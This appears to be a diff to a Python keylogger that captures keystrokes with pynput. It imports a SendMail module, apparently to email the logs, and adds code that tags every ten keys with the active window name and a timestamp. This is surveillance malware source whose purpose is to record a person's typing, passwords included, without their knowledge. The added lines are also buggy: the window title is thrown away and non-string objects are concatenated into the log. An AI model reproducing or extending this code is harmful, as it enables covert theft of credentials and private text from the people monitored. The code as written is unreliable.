@@ -2,6 +2,8 @@ import pynput
 from pynput.keyboard import Key,Listener
 import SendMail
 import os
+import win32gui
+import datetime
 
 
 count = 0
@@ -9,9 +11,15 @@ keys = []
 
 def on_press(key):
     global keys, count
+    # Get the window name while typing :
+    w = win32gui
+    w.GetWindowText(w.GetForegroundWindow())
     keys.append(str(key))
     count += 1
     if count > 10 :
+        # every 10 keys will be added with name of the widow name date and time above them
+        e = datetime.datetime.now()
+        keys.append('At window: '+w+ ' ' +e+'\n') 
         count = 0
         write_file(keys)
 
